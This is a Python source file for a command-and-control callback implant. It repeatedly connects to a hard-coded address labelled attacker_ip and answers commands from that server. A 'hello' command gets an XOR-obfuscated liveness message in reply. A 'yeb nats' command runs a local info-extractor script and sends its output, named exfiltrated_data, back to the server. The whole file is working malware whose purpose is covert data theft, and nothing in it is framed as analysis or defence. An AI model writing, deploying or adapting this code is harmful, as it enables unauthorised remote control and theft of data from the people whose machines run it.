import socket
import subprocess
import sys
notify=[105, 77, 0, 65, 76, 73, 86, 69]
# def encrypt():
#      s=b"Im alive"
#      encrypted=[]
#      for byte in s:
#          encrypted.append((byte^32))
#      print(encrypted)
#      global notify;notify=encrypted
def decrypt()->'bytes':
    global notify
    returned=bytearray()
    for char in  notify:
        returned.append((char^32))
    return  bytes(returned)
class CallBack:
    def __init__(self):
        self.attacker_ip:'str'="94.249.90.154"
        self.port:'int'=47555
    def connect_back(self):
        """Used to connect to the CNC server"""
        while True:
            try:
                c_socket=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)
                c_socket.connect((self.attacker_ip,self.port))
                while True:
                    recieved_command=c_socket.recv(1024).decode().strip("\n").strip().lower()
                    if recieved_command=="hello":
                        c_socket.send(decrypt()+b"\n")
                    elif recieved_command=="yeb nats":
                        hcommand=subprocess.run("python3 /opt/tools/cyber_projects/info_extractor/info_extractor.py  --all",capture_output=True,shell=True)
                        if hcommand.returncode==0:
                            exfiltrated_data:'str'=hcommand.stdout.decode()
                            c_socket.sendall(exfiltrated_data.encode())
                    elif recieved_command=="run":
                        sys.exit(0)
            except:
                continue
CallBack().connect_back()
# try:
#     s=socket.socket(family=socket.AF_INET,type=socket.SOCK_STREAM)
#     s.connect(("127.0.0.1",8888))
#     try:
#         while True:
#             a=s.recv(1024)
#             print(a.decode())
#     except:
#         pass
# except:
#     pass

